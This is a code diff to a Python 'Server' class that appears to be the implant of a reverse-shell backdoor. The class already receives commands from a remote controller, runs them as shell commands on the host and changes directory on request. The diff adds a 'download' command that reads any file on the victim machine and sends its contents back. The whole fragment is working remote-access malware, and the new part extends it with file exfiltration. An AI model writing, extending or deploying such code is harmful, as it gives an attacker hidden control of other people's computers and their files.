@@ -22,11 +22,17 @@ class Server:
             except Exception:
                 self.connect()
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            data = file.read().decode("utf-8")
+            return data
+
     def change_directory(self, path):
         os.chdir(path)
         return f"Changed directory to {self.execute_command_on_system('pwd')}."
 
     def receive_commands_and_execute(self):
+        sending_data = ""
         while True:
             try:
                 receive = self.reliable_receive()
@@ -36,11 +42,16 @@ class Server:
                     exit()
                 elif split_command[0] == "cd" and split_command[1] is not None:
                     result = self.change_directory(split_command[1])
-                    self.reliable_send(result)
+                    sending_data = result
+                elif split_command[0] == "download" and split_command[1] is not None:
+                    file = self.read_file(split_command[1])
+                    sending_data = file
                 else:
                     result = self.execute_command_on_system(receive)
-                    self.reliable_send(result)
-            except Exception:
+                    sending_data = result
+
+                self.reliable_send(sending_data)
+            except Exception as error:
                 self.reliable_send("We encountered an error.")
 
     def execute_command_on_system(self, command):
